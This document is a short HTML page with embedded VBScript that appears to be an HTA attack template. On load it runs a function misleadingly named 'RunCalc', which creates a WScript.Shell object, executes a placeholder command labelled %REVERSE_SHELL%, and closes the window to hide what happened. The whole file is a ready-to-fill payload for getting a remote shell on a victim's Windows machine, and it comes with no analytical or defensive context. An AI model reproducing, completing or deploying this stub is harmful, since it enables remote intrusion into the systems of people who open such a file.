<html>
<script language="VBScript">
Function RunCalc()
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run %REVERSE_SHELL%
    window.close()
End Function

RunCalc
</script>
</html>
